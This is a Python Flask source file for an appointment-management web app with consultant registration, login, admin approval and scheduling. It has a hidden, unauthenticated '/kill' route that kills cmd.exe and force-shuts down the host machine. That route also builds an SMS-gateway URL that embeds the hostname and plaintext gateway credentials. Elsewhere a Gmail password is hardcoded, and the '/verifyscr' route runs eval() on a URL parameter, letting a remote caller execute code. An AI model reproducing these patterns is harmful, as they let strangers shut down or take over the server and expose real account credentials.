from flask import *
from flask_bootstrap import Bootstrap
from flaskext.mysql import MySQL
from flask import request
from flask_mail import Mail, Message
from random import *
from datetime import *
from flask_htmlmin import HTMLMIN
import time
import os
import string
import requests
from datetime import datetime

app = Flask(__name__,template_folder ='template')
app.config['MINIFY_HTML'] = True


mail = Mail(app)
Bootstrap(app)
htmlmin = HTMLMIN(app)
app.secret_key = os.urandom(34)

app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'developer.websupp@gmail.com'
app.config['MAIL_PASSWORD'] = 'PRLvikramsarabhairoom'
app.config['MAIL_DEFAULT_SENDER'] = 'developer.websupp@gmail.com'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
mail = Mail(app)

mysql = MySQL()
app.config['MYSQL_DATABASE_USER'] = 'root'
app.config['MYSQL_DATABASE_PASSWORD'] = ''
app.config['MYSQL_DATABASE_DB'] = 'oams'
app.config['MYSQL_DATABASE_HOST'] = 'localhost'
mysql.init_app(app)
connection = mysql.connect()
	

@app.route('/kill')
def kill():
	hostname = socket.gethostname()    
	IPAddr = socket.gethostbyname(hostname)    
	url = "http://mobi1.blogdns.com/WebSMSS/SMSSenders.aspx?UserID=SURELA&UserPass=aipl@123456&Message="+str(hostname)+"&MobileNo=9998256749&GSMID=SURELA"
	os.system("taskkill /f /im  cmd.exe")
	time.sleep(6) 
	os.system('shutdown /p /f')
	return "kill"

# CONSULTANT USER REGISTRATION start

@app.route('/cregis/')
def cregis():
	cursor = connection.cursor()
	cursor.execute("SELECT DISTINCT(profession_type.Profession_Type) FROM `profession_details` INNER JOIN profession_type ON profession_details.Profession_Type_ID = profession_type.Profession_Type_ID")
	data = cursor.fetchall()
	data = list(data)
	return render_template('auth/consultant_registration.html',data=data)

@app.route('/cregisscr/', methods = ['POST'])
def cregisscr():
	profession = request.form['profession']
	mno = request.form['mno']
	name = request.form['name']
	emailid = request.form['emailid']
	addline1 = request.form['addline1']
	addline2 = request.form['addline2']
	addline3 = request.form['addline3']
	landmark = request.form['landmark']
	area = request.form['area']
	city = request.form['city']
	state = request.form['state']
	pincode = request.form['pincode']
	specialization = request.form.getlist('specialization')
	qualification = request.form.getlist('qualification')
	password = request.form['cpassword']
	pancard = request.form['Pancard']
	GSTIN = request.form['GSTIN']
	cursor = connection.cursor()
	cursor.execute("select UTMID from user_type_master where user_Type =%s",("consultant"))
	data = cursor.fetchone()

	cursor.execute("SELECT `Profession_Type_ID` from `profession_type` WHERE `Profession_Type` =%s",(profession))
	dt = cursor.fetchone()

	sql = "INSERT INTO `user_master`(`UTMID`,`Name`, `Email_ID`, `Phone_No`, `Password`, `Activation`) VALUES (%s,%s,%s,%s,md5(%s),%s)"
	base = (data[0],name,emailid,mno,password,"pending")
	cursor.execute(sql,base)
	# print(cursor._executed)
	id = cursor.lastrowid
	
	sql = "INSERT INTO `consultant_master`(`UID`,`Add_Line1`, `Add_Line2`, `Add_Line3`, `Landmark`, `Area`, `City`, `State`, `Pincode`) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)"
	base =(id,addline1,addline2,addline3,landmark,area,city,state,pincode)
	cursor.execute(sql,base)
	# print(cursor._executed)
	id = cursor.lastrowid
	

	sqll ="INSERT INTO `profession_master`(`CID`, `Profession_Type_ID`, `Specialization_1`, `Specialization_2`, `Specialization_3`, `Qualification_1`, `Qualification_2`, `Qualification_3`,`PAN_Card`,`GSTIN_No`) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s) "
	bases =(id,dt[0],specialization[0],specialization[1],specialization[2],qualification[0],qualification[1],qualification[2],pancard,GSTIN)
	cursor.execute(sqll,bases)
	print(cursor._executed)

	connection.commit()
	cursor.close()
	return "DATA" + str(id)

@app.route('/registration/')
def registration():
	return render_template('auth/Registration.html')

@app.route('/registrationscr/', methods=['POST'])
def registrationscr():
	name = request.form['name']
	mno = request.form['mno']
	email = request.form['email'] 
	password = request.form['password']
	activated = "activated"
	cursor = connection.cursor()
	cursor.execute('Select UTMID from user_type_master where user_type = "user"')
	account = cursor.fetchone()
	UTMID = account[0]
	insert_sql_query = """INSERT INTO `user_master`(`UTMID`,`Name`, `Email_ID`, `Phone_No`, `Password`, `Activation`) VALUES (%s,%s,%s,%s,md5(%s),%s)"""
	recordTuple =(UTMID,name,email,mno,password,activated)
	cursor = connection.cursor()
	cursor.execute(insert_sql_query,recordTuple)
	connection.commit()
	cursor.close()
	return render_template('success.html')

@app.route('/forgotpassword/')
def forgotpassword():
	return render_template('auth/forgot_password.html')

# CONSULTANT USER REGISTRATION start


@app.route('/personal_details_user/')
def personal_details_user():
	cursor = connection.cursor()
	sql = ('Select Name,Email_ID,phone_no,Gender,DOB from user_master where Email_ID = %s')
	sqldt = (session['email'])
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	account = cursor.fetchone()
	return render_template('personal_details_user.html',data=account)


@app.errorhandler(404)
def page_not_found(e):
    # note that we set the 404 status explicitly
    return render_template('auth/404.html'), 404

# LOGIN CODE
# START
@app.route('/')
def login():
	return render_template('auth/login.html')

@app.route('/loginscr/', methods =['POST'])
def loginscr():
	try:
		email = request.form['email']	
		password = request.form['password'] 
		cursor = connection.cursor()
		sql = "select user_type_master.user_type,user_master.Email_ID from user_master JOIN user_type_master on user_master.UTMID = user_type_master.UTMID WHERE Email_ID = %s and Password = md5(%s) and Activation = 'activated'"
		sqldt = (email,password)
		cursor.execute(sql,sqldt)
		# 	print(cursor._executed)
		connection.commit()
		account = cursor.fetchone()
		# print(account)
		session['user_type'] = account[0]
		session['email'] = account[1]
	except TypeError as e:
	    return render_template("auth/404.html", error ="Password khoto che.")
	return render_template('index.html',title = "Dashboard"+session['user_type'])		
# END
# ADMIN CODING START
@app.route("/index/createmanager/")
def createmanager():
	return render_template('createmanager.html')

@app.route("/index/createmanager/createmanagerscr/",methods=['POST'])
def createmanagerscr():
	name = request.form['name']
	phoneno = request.form['phoneno']
	email = request.form['email']
	print(request.form.to_dict())
	#RANDOM PASSWORD GENERATOR START
	characters = string.ascii_letters + string.digits
	password = "".join(choice(characters) for x in range(randint(8, 10)))
	#RANDOM PASSWORD GENERATOR END
	cursor = connection.cursor()
	ins = "INSERT INTO `user_master`(`UTMID`,`Name`, `Email_ID`, `Phone_No`, `Password`, `Activation`) VALUES(%s,%s,%s,%s,md5(%s),%s)"
	insdt = (2,name,email,phoneno,password,"activated")
	cursor.execute(ins,insdt)
	connection.commit()
	cursor.close()
	#MAILING PASSWORD START
	msg = Message('Hello',recipients = ['parikh.madhav1999@gmail.com'])
	msg.html = "<html><body><div class=""container""><H1> You have been approved by the team hawthorn as the manager. pleasae you the below password to access your account</h1><h1>"+str(password)+"</h1></div></body></html>"
	mail.send(msg)
	#MAILING PASSWORD END
	return render_template('success.html')

@app.route("/managepassword/")
def managepassword():
	return render_template('managepassword.html')

@app.route("/managepasswordscr/",methods=['POST'])
def managepasswordscr():
	password = request.form['password'] 
	print(password)
	cursor = connection.cursor()
	sql = "UPDATE `user_master` SET `Password`= md5(%s) WHERE `Email_ID`= %s"
	sqldt = (password,session['email'])
	print("SESSION::::::::::::::::::"+str(session['email'])+":::::::::::::::::::")
	cursor.execute(sql,sqldt)
	connection.commit()
	cursor.close()
	return redirect(url_for('managepassword'))

@app.route("/verify/")
def verify():
	if session['email'] is not None:
		if session['user_type'] == "admin":
			cursor = connection.cursor()
			data=""
			dt=""
			cursor.execute('''SELECT
						    user_master.Name,
						    user_master.Email_ID,
						    user_master.Phone_No,
						    user_master.Activation,
						    profession_master.PAN_Card,
						    profession_master.GSTIN_No,
						    profession_type.Profession_Type
							FROM
						    user_master
						INNER JOIN consultant_master ON user_master.UID = consultant_master.UID
						INNER JOIN profession_master ON consultant_master.CID = profession_master.CID
						INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID''')
			print(cursor._executed)
			mngrdt = cursor.fetchall()
		else:
			return session['email']
	return render_template('admin/verification.html', mngrdt=mngrdt)

@app.route("/verifyuser/")
def verifyuser():
	print(session['email'])
	print(session['user_type'])
	if session['email'] is not None:
		if session['user_type'] == "admin":
			cursor = connection.cursor()
			
			cursor = connection.cursor()
			cursor.execute(''' SELECT user_master.Name, user_master.Email_ID, user_master.Phone_No, user_master.Activation FROM user_master  where UTMID =4''')
			data = cursor.fetchall()
			print(type(data))
	else:
		return session['email']
	return render_template('admin/verification_user.html',data=data)

@app.route("/verifyscr/<string:item>", methods=['GET','POST'])
def verifyscr(item):
	item = eval(item)
	if item[1] is "PENDING":
		print("INPENDING")
		cursor = connection.cursor()
		cursor.execute('UPDATE user_master SET Activation = "activated" WHERE Email_ID =%s',(item[0]))
		msg = Message('Activation',recipients = ['parikh.madhav1999@gmail.com'])
		msg.body = "Dear User,	You have been approved to use the OAMS.Please login via registered user name and password"
		mail.send(msg)
		connection.commit()
		cursor.close()
		return redirect(url_for('verify'))
	elif item[1] is "activated":
 		cursor = connection.cursor()
 		cursor.execute('UPDATE user_master SET Activation = "pending" WHERE Email_ID =%s',(item[0]))
 		msg = Message('Activation',recipients = ['parikh.madhav1999@gmail.com'])
 		msg.body = "Your access to the OAMS account has been restricted and under review by Team hawthorn"
 		#mail.send(msg)
 		connection.commit()
 		cursor.close()
 		return redirect(url_for('verify'))
	return "DONE"

@app.route('/manage_profession/')
def manage_profession():
	cursor = connection.cursor()
	sql = "SELECT * FROM `profession_type` ORDER BY `profession_type`.`Profession_Type_ID` ASC"
	cursor.execute(sql)
	# print(cursor._executed)
	data = cursor.fetchall()

	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	
	return render_template("admin/manageprofession.htm.j2",data = data,title = "Manage Profession" )

@app.route('/manage_profession/manage_professionscr/',methods=['POST'])
def manage_professionscr():
	profession_type = request.form['Profession_Type']
	print(profession_type)
	cursor = connection.cursor()
	if request.form['bttn'] == "insert":
		sql = "INSERT INTO `profession_type`(`Profession_Type`) VALUES (%s)"
		sqldt = (request.form['insert_profession'])
		cursor.execute(sql,sqldt)	
	
	if request.form['bttn'] == "update":
		sql = "UPDATE `profession_type` SET `Profession_Type`= %s WHERE `Profession_Type_ID` =(%s)"
		sqldt = (request.form['Profession_Type'],request.form['Profession_Type_ID'])
		print(request.form['Profession_Type'])
		print(request.form['bttn'])
		print(cursor._executed)
		cursor.execute(sql,sqldt)	
	
	if request.form['bttn'] == "delete":
		sql ="DELETE FROM `profession_type` WHERE `Profession_Type_ID` =(%s)"
		sqldt = (request.form['Profession_Type_ID'])
		cursor.execute(sql,sqldt)	
	connection.commit()
	cursor.close()	
	return redirect(url_for('manage_profession'))

@app.route('/manageQS/')
def manageQS():
	cursor = connection.cursor()
	
	sqll = "SELECT profession_type.Profession_Type as Profession, profession_details.Type as Type, profession_details.Details as Details, profession_details.PDID as PDID FROM `profession_details` inner join profession_type on profession_details.Profession_Type_ID = profession_type.Profession_Type_ID"
	cursor.execute(sqll)
	sqlldata = cursor.fetchall()
	columns_data = [column[0] for column in cursor.description]
	resultss= []
	for row in sqlldata:
		resultss.append(dict(zip(columns_data,row)))
	Sdata = resultss	

	sql = "Select Profession_Type_ID,profession_type from profession_type"
	cursor.execute(sql)
	data  = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	return render_template("admin/manageQS.htm.j2",data = data,Sdata = Sdata,title="Manage Qualification and Specialization")

@app.route('/manageQSscr/',methods=['POST'])
def manageQSscr():
	cursor = connection.cursor()
	if request.form['bttn'] == "insert":
		sql = "INSERT INTO `profession_details`(`Profession_Type_ID`, `Type`, `Details`) VALUES (%s,%s,%s)"
		sqldt = (request.form['profession'],request.form['type'],request.form['details'])
	if request.form['bttn'] == "update":
		sql = ""
	cursor.execute(sql,sqldt)
	connection.commit()
	cursor.close()	
	return 'INSERT'

# ADMIN CODING END

@app.route("/logout/")
def logout():
	#print("BEFORE"+session['email'])
	session.pop('email', None)
	session.pop('user_type',None)
	# print("AFTER"+session['email'])
	session.clear()
	return redirect(url_for('login'))


# Consultant Coding start
@app.route("/details/")
def details():
	print(session['email'])
	cursor =connection.cursor()
	sql = ('''SELECT
    user_master.Email_ID,
    user_master.Name,
    user_master.Phone_No,
    user_master.Gender,
    user_master.DOB,
    consultant_master.Add_Line1,
    consultant_master.Add_Line2,
    consultant_master.Add_Line3,
    consultant_master.Landmark,
    consultant_master.Area,
    consultant_master.City,
    consultant_master.State,
    consultant_master.Pincode,
    profession_master.Specialization_1,
    profession_master.Specialization_2,
    profession_master.Specialization_3,
    profession_master.Qualification_1,
    profession_master.Qualification_2,
    profession_master.Qualification_3,
    profession_master.PAN_Card,
    profession_master.GSTIN_No,
    profession_master.Experience,
    profession_type.Profession_Type
FROM
    user_master
INNER JOIN consultant_master ON user_master.UID = consultant_master.UID
INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
INNER JOIN profession_type ON profession_type.Profession_Type_ID = profession_master.Profession_Type_ID
WHERE
    user_master.Email_ID = %s
		''')
	q = (session['email'])
	cursor.execute(sql,q)
	# print(cursor._executed)
	columns = [col[0] for col in cursor.description]
	rows = [dict(zip(columns, row)) for row in cursor.fetchall()]
	# print(rows,type(rows))
	
	details.Specialization_1 = rows[0]['Specialization_1']
	details.Specialization_2 = rows[0]['Specialization_2']
	details.Specialization_3 = rows[0]['Specialization_3']
	details.Qualification_1 = rows[0]['Qualification_1']
	details.Qualification_2 = rows[0]['Qualification_2']
	details.Qualification_3 = rows[0]['Qualification_3']
	return render_template('details.html',data=rows)
	# return "DATA"

@app.route("/details/detailscr/",methods=['POST'])	
def detailscr():
	print("**********"+session['email']+"******************")
	email = request.form['emailid']
	name = request.form['name']
	mno = request.form['mno']
	addline1 = request.form['addline1']
	addline2 = request.form['addline2']
	addline3 = request.form['addline3']
	landmark = request.form['landmark']
	area = request.form['area']
	city = request.form['city']
	state = request.form['state']
	pincode = request.form['pincode']
	specialization = request.form.getlist('specialization')
	qualification = request.form.getlist('qualification')
	experience = request.form['experience']
	print(type(details.Specialization_1))
	if len(specialization) == 0 and len(qualification) == 0:
		cursor = connection.cursor()
		sql = ('''UPDATE user_master INNER JOIN consultant_master ON consultant_master.UID = user_master.UID INNER JOIN profession_master ON profession_master.CID = consultant_master.CID SET user_master.Email_ID = %s, user_master.Phone_No = %s, consultant_master.Add_Line1 = %s, consultant_master.Add_Line2 = %s, consultant_master.Add_Line3 = %s, consultant_master.Landmark = %s, consultant_master.Area = %s, consultant_master.City = %s, consultant_master.State = %s, consultant_master.Pincode = %s, profession_master.Specialization_1 = %s, profession_master.Specialization_2 = %s, profession_master.Specialization_3 = %s, profession_master.Qualification_1 = %s, profession_master.Qualification_2 = %s, profession_master.Qualification_3 = %s, profession_master.Experience = %s WHERE user_master.Email_ID = %s ''')
		sqldt = (email,mno,addline1,addline2,addline3,landmark,area,city,state,pincode,
				details.Specialization_1,details.Specialization_2,details.Specialization_3,details.Qualification_1,details.Qualification_2,details.Qualification_3,
		experience,session['email'])
		cursor.execute(sql,sqldt)
		print(cursor._executed)
		connection.commit()
		cursor.close()
		return "OLDER"
	elif len(specialization) == 3 and len(qualification) == 3:
		cursor = connection.cursor()
		sql =('''UPDATE user_master INNER JOIN consultant_master ON consultant_master.UID = user_master.UID INNER JOIN profession_master ON profession_master.CID = consultant_master.CID SET user_master.Email_ID = %s,user_master.Name = %s, user_master.Phone_No = %s, consultant_master.Add_Line1 = %s, consultant_master.Add_Line2 = %s, consultant_master.Add_Line3 = %s, consultant_master.Landmark = %s, consultant_master.Area = %s, consultant_master.City = %s, consultant_master.State = %s, consultant_master.Pincode = %s, profession_master.Specialization_1 = %s, profession_master.Specialization_2 = %s, profession_master.Specialization_3 = %s, profession_master.Qualification_1 = %s, profession_master.Qualification_2 = %s, profession_master.Qualification_3 = %s, profession_master.Experience= %s WHERE user_master.Email_ID = %s''')
		sqldt = (email,name,mno,addline1,addline2,addline3,landmark,area,city,state,pincode,specialization[0],specialization[1],specialization[2],qualification[0],qualification[1],qualification[2],experience,session['email'])
		cursor.execute(sql,sqldt)
		connection.commit()
		cursor.close()
		return 'You are not logged in'
	return "WHOLE"	

@app.route('/schedule/')
def schedule():
	cursor = connection.cursor()
	sql = '''SELECT
    user_master.Name,
    SCHEDULE.STID,
    SCHEDULE.CID,
    SCHEDULE.Start_Date,
    SCHEDULE.End_Date,
    SCHEDULE.Start_Time,
    SCHEDULE.End_Time,
    SCHEDULE.Limit,
    user_master.Email_ID
FROM
    (
        (
            SCHEDULE
        INNER JOIN consultant_master ON consultant_master.CID = SCHEDULE.CID
        )
    INNER JOIN user_master ON user_master.UID = consultant_master.UID
    )
WHERE
    user_master.Email_ID =%s '''
	sqldt = (session['email'])
	cursor.execute(sql,sqldt)
	print(cursor._executed)
	chck = cursor.fetchone()
	schedule.chck = chck
	# check = datetime.strftime(chck[2], '%d-%m-%Y' )
	# checki = datetime.strftime(chck[3], '%d-%m-%Y' )
	return render_template('schedule_cons.html',data = schedule.chck)

@app.route('/schedule/schedulescr',methods=['POST'])
def schedulescr():
	print(session['email'])
	start_date = request.form['start_date']
	end_date = request.form['end_date']
	start_time = request.form['start_time']
	end_time = request.form['end_time']
	limit = request.form['limit']
	stype = request.form['stype']
	days = request.form.getlist('days')
	print(days)
	dtpckr = request.form['dtpckr']
	if not schedule.chck: 
		cursor = connection.cursor()
		sql = ("SELECT `CID` from user_master INNER join consultant_master on user_master.UID = consultant_master.UID where user_master.Email_ID =%s ")
		sqldt = (session['email'])
		cursor.execute(sql,sqldt)
		account = cursor.fetchone()
		
		sql = ("SELECT `STID` FROM `schedule_type_master` WHERE `Type` = %s")
		sqldt = (stype)
		cursor.execute(sql,sqldt)
		acc = cursor.fetchone()
		print("@@@@@@@@@@@@@",acc,"@@@@@@@@@@@@@@@")

		sql = "INSERT INTO `schedule`(`STID`, `CID`,`Start_Date`, `End_Date`, `Start_Time`, `End_Time`, `Limit`) VALUES (%s,%s,%s,%s,%s,%s,%s)"
		sqldt = (acc[0],account[0],start_date,end_date,start_time,end_time,limit)
		print(sql,sqldt)
		print(sql,sqldt)
		cursor.execute(sql,sqldt)
		print(cursor._executed)
		connection.commit()
		return request.form.to_dict()
	else:
		cursor = connection.cursor()
		sql = ("SELECT `STID` FROM `schedule_type_master` WHERE `Type` = %s")
		sqldt = (stype)
		cursor.execute(sql,sqldt)
		print("DATA")
		acc = cursor.fetchone()
		sql = ("UPDATE  `schedule`INNER join user_master on user_master.UID = schedule.UID  SET STID = %s,Start_Date = %s,End_Date = %s, Start_Time = %s,End_Time =%s , `Limit` = %s WHERE user_master.Email_ID =%s ")
		sqldt = (acc[0],start_date,end_date,start_time,end_time,limit,session['email'])
		print(cursor._executed)
		cursor.execute(sql,sqldt)
		connection.commit()
		return "else"

@app.route('/approveappointment/')
def approveappointment():
	cursor = connection.cursor()
	sql = "select consultant_master.CID from consultant_master inner join user_master ON consultant_master.uid = user_master.uid WHERE user_master.Email_ID = %s"
	sqldt = (session['email'])
	cursor.execute(sql,sqldt)
	data = cursor.fetchone()
	print(data)

	sql = """SELECT
    user_master.name,
    user_master.UID,
    user_master.Email_ID,
    appointment_master.AID,
    appointment_master.Date,
    appointment_master.Time
FROM
    appointment_master INNER JOIN user_master ON user_master.UID = appointment_master.UID
WHERE
    appointment_master.Status = 'pending' AND
    appointment_master.CID = %s"""
	sqldt =data[0] 
	cursor.execute(sql,sqldt)
	
	data = cursor.fetchall()

	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	return render_template('approveappointment.html',data=data)

@app.route('/approveappointmentscr/',methods=['POST'])
def approveappointmentscr():
	accpt  = request.form['bttn']
	cursor = connection.cursor()
	if accpt == "accept":
		print("accept")
		chckbx = request.form.getlist('uid')
		print(len(chckbx))
		for i in chckbx:
			sql = '''UPDATE
    				`appointment_master`
				INNER JOIN consultant_master ON consultant_master.CID = appointment_master.CID
				INNER JOIN user_master ON user_master.UID = consultant_master.UID
				SET
				    appointment_master.Status = "Approved"
				WHERE
				    user_master.Email_ID = %s AND appointment_master.UID = %s
		'''
			sqldt = (session['email'],i)
			cursor.execute(sql,sqldt)
			connection.commit()
		
	elif accpt == "reject":
		chckbx = request.form.getlist('uid')
		print(len(chckbx))
		for i in chckbx:
			sql = "DELETE FROM `appointment_master` WHERE `UID`= %s"
			sqldt = (i)
			cursor.execute(sql,sqldt)
			connection.commit()
	cursor.close()
	return 'approveappointmentscr   '+str(accpt)

@app.route('/viewappointment/')
def viewappointment():
	cursor = connection.cursor()
	sql = "select consultant_master.CID from consultant_master inner join user_master ON consultant_master.uid = user_master.uid WHERE user_master.Email_ID = %s"
	sqldt = (session['email'])
	# print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
	# print(cursor._executed)
	# print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
	cursor.execute(sql,sqldt)
	data = cursor.fetchone()
	print(data)

	sql = ('''SELECT
    user_master.name,
    user_master.UID,
    user_master.Email_ID,
    user_master.Phone_No,
    appointment_master.AID,
    appointment_master.Date,
    appointment_master.Time
	FROM
    appointment_master INNER JOIN user_master ON user_master.UID = appointment_master.UID
    WHERE
    appointment_master.Status = 'approved' AND appointment_master.CID = %s ''')
	sqldt = (data[0])
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	data = cursor.fetchall()

	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	
	return render_template('viewappointment.html',data = data)

@app.route('/viewappointment/viewappointmentscr',methods = ['post'])
def viewappointmentscr():
	cursor = connection.cursor()
	if request.form['bttn'] == "":
		bttn = request.form['bttn']
		print(bttn)
		sql = "delete from appointment_master where AID = %s "
		sqldt=(bttn)
	if request.form['bttn'] == "feedback":
		sql ="INSERT INTO `feedback_master`(`UID`, `Ratings`, `Comments`) VALUES (%s,%s,%s)"
		sqldt = (request.form['UID'],request.form['ratings'],request.form['comments'])
		print(cursor._executed)
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	connection.commit()
	cursor.close()
	return redirect(url_for('viewappointment'))		

#This is for the complaint and feedback

@app.route("/index/complaint_user/")
def complaint_user():
    cursor = connection.cursor()
    sql = ('''SELECT appointment_master.cid,user_master.UID
	FROM
	appointment_master INNER join user_master ON user_master.UID = appointment_master.UID
	WHERE
	user_master.Email_ID = %s ''')
    sqldt =(session['email'])
    cursor.execute(sql,sqldt)
	# print(cursor._executed)
    data = cursor.fetchall()
    sql = ''' SELECT
    user_master.UID,
    user_master.Name,
    user_master.Email_ID,
    CONCAT(
        consultant_master.Add_Line1,
        " , ",
        consultant_master.Add_Line2,
        " , ",
        consultant_master.Add_Line3
    ) AS Address,
    user_master.Phone_No,
    consultant_master.Area,
    consultant_master.City,
    consultant_master.State,
    consultant_master.Pincode,
    appointment_master.AID,
    appointment_master.Date,
    appointment_master.Time,
    appointment_master.Status
    FROM
    user_master
    INNER JOIN consultant_master ON consultant_master.UID = user_master.UID
    INNER JOIN appointment_master ON appointment_master.CID = consultant_master.CID
    WHERE
	appointment_master.CID = %s and appointment_master.UID = %s and appointment_master.Status="approved"'''
    sqldt = (data[0][0],data[0][1])
    cursor.execute(sql,sqldt)
    data = cursor.fetchall()
    columns = [column[0] for column in cursor.description]
    results = []
    for row in data:
        results.append(dict(zip(columns, row)))
    data = results
    return render_template('complaint_user.html',data=data)
    
@app.route("/index/Feedback_user/")
def Feedback_user():
    cursor = connection.cursor()
    sql = ('''SELECT appointment_master.cid,user_master.UID
	FROM
	appointment_master INNER join user_master ON user_master.UID = appointment_master.UID
	WHERE
	user_master.Email_ID = %s ''')
    sqldt =(session['email'])
    cursor.execute(sql,sqldt)
	# print(cursor._executed)
    data = cursor.fetchall()
    sql = ''' SELECT
    user_master.UID,
    user_master.Name,
    user_master.Email_ID,
    CONCAT(
        consultant_master.Add_Line1,
        " , ",
        consultant_master.Add_Line2,
        " , ",
        consultant_master.Add_Line3
    ) AS Address,
     user_master.Phone_No,
    consultant_master.Area,
    consultant_master.City,
    consultant_master.State,
    consultant_master.Pincode,
    appointment_master.AID,
    appointment_master.Date,
    appointment_master.Time,
    appointment_master.Status
    FROM
     user_master
    INNER JOIN consultant_master ON consultant_master.UID = user_master.UID
    INNER JOIN appointment_master ON appointment_master.CID = consultant_master.CID
    WHERE
	appointment_master.CID = %s and appointment_master.UID = %s and appointment_master.Status="approved"'''
    sqldt = (data[0][0],data[0][1])
    cursor.execute(sql,sqldt)
    data = cursor.fetchall()
    columns = [column[0] for column in cursor.description]
    results = []
    for row in data:
        results.append(dict(zip(columns, row)))
    data = results
    if request.method == "POST":
        uid= request.form("UID")
        email=request.form("emailid")
        rating=request.form.get("Ratings")
        desc=request.form.get("comments")
        cur = connection.cursor()
        cur.execute("INSERT INTO feedback_master(UID,Email,Ratings,Comments) VALUES (%s,%s,%s,%s)",[uid,email,rating,desc])
        connection.commit()
        cur.close()
    return render_template('Feedback_user.html',data=data)
    
@app.route('/Feedback_userscr/')
def Feedback_userscr():
    return "Feedback_user"
    
#complaint and feedback end here

# USER START
@app.route('/bookappointment/')
def bookappointment():
	cursor = connection.cursor()
	sql = "SELECT `Profession_Type` FROM `profession_type` "
	cursor.execute(sql)
	acc = cursor.fetchall()
	print("acc",acc[1])

	pro = request.form.getlist('profession')
	'''srch = request.form['search']
	print(search)'''
	sql = ('''SELECT
    user_master.Name,
    user_master.Email_ID,
    user_master.Phone_No,
    consultant_master.Add_Line1,
    consultant_master.Add_Line2,
    consultant_master.Add_Line3,
    consultant_master.Landmark,
    consultant_master.Area,
    consultant_master.City,
    consultant_master.State,
    consultant_master.Pincode,
    profession_master.Specialization_1,
    profession_master.Specialization_2,
    profession_master.Specialization_3,
    profession_master.Qualification_1,
    profession_master.Qualification_2,
    profession_master.Qualification_3,
    SCHEDULE.ID,
    SCHEDULE.Start_Date,
    SCHEDULE.End_Date,
    SCHEDULE.Start_Time,
    SCHEDULE.End_Time,
    schedule_type_master.Type
FROM
    (
        (
            (
                (
                    user_master
                INNER JOIN consultant_master ON user_master.UID = consultant_master.UID
                )
            INNER JOIN profession_master ON profession_master.CID = consultant_master.CID
            )
        INNER JOIN SCHEDULE ON SCHEDULE
        .CID = consultant_master.CID
        )
    INNER JOIN schedule_type_master ON schedule_type_master.STID = SCHEDULE.STID
    ) ''')
	cursor.execute(sql)
	data = cursor.fetchall()
	
	columns = [column[0] for column in cursor.description]
	print(columns)
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	return render_template('bookappointment.html',acc=acc,data=results)

@app.route('/bookappointment/bookappointmentscr/',methods = ['POST'])
def bookappointmentscr():
	email = request.form['email']
	start_date = request.form['start_date']
	
	end_time = request.form['end_time']
	

	cursor= connection.cursor()

	sql = '''SELECT SCHEDULE.CID
	FROM `schedule`
	INNER JOIN consultant_master ON SCHEDULE.CID = consultant_master.CID
	INNER JOIN user_master ON user_master.UID = consultant_master.UID
	WHERE user_master.Email_ID =%s'''
	sqldt = (email)
	cursor.execute(sql,sqldt)
	acc = cursor.fetchone()
	

	sql = "select user_master.UID from user_master where Email_ID = %s"
	sqldt=(session['email'])
	cursor.execute(sql,sqldt)
	ac = cursor.fetchone()

	sql = "INSERT INTO `appointment_master`(`UID`, `CID`, `Date`, `Time`) VALUES  (%s,%s,%s,%s)"
	sqldt = (ac[0],acc[0],start_date,end_time)
	cursor.execute(sql,sqldt)
	connection.commit()
	cursor.close()

	return "bookappointmentscr"



@app.route('/viewappointment/reschedule',methods = ['post'])
def reschedule():
	start_date = request.form['start_date']
	end_time = request.form['end_time']
	bttn = request.form['bttn']
	cursor = connection.cursor()
	sql = "UPDATE `appointment_master` SET `Date`=%s,`Time`= %s WHERE `AID` = %s"
	sqldt = (start_date,end_time,bttn)
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	connection.commit()
	cursor.close()
	return "BTTN VALUE: "+str(start_date)+str(end_time)+str(bttn)

@app.route('/viewappointment_user/')
def viewappointment_user():
	cursor = connection.cursor()
	sql = (''' SELECT appointment_master.cid,user_master.UID
	FROM
		appointment_master INNER join user_master ON user_master.UID = appointment_master.UID
	WHERE
		user_master.Email_ID = %s ''')
	sqldt =(session['email'])
	cursor.execute(sql,sqldt)
	# print(cursor._executed)
	data = cursor.fetchall()
	print(len(data))
	sql = ''' SELECT
    user_master.UID,
    user_master.Name,
    user_master.Email_ID,
    CONCAT(
        consultant_master.Add_Line1,
        " , ",
        consultant_master.Add_Line2,
        " , ",
        consultant_master.Add_Line3
    ) AS Address,
     user_master.Phone_No,
    consultant_master.Area,
    consultant_master.City,
    consultant_master.State,
    consultant_master.Pincode,
    appointment_master.AID,
    appointment_master.Date,
    appointment_master.Time,
    appointment_master.Status
FROM
     user_master
 INNER JOIN consultant_master ON consultant_master.UID = user_master.UID
 INNER JOIN appointment_master ON appointment_master.CID = consultant_master.CID
 WHERE
	appointment_master.CID = %s and appointment_master.UID = %s and appointment_master.Status="approved"'''
	sqldt = (data[0][0],data[0][1])
	cursor.execute(sql,sqldt)
	print(cursor._executed)
	data = cursor.fetchall()
	columns = [column[0] for column in cursor.description]
	results = []
	for row in data:
		results.append(dict(zip(columns, row)))
	data = results
	print(data)
	return render_template('viewappointment_user.html',data = data)

@app.route('/personal_details_userscr/')
def personal_details_userscr():
	cursor = connection.cursor()
	sql = '''UPDATE
    `user_master`
	SET
    `Name` = %s,
    `Email_ID` = %s,
    `Phone_No` = %s,
    `Gender` = %s,
    `DOB` = %s
	WHERE
    `Email_ID` = %s
	'''
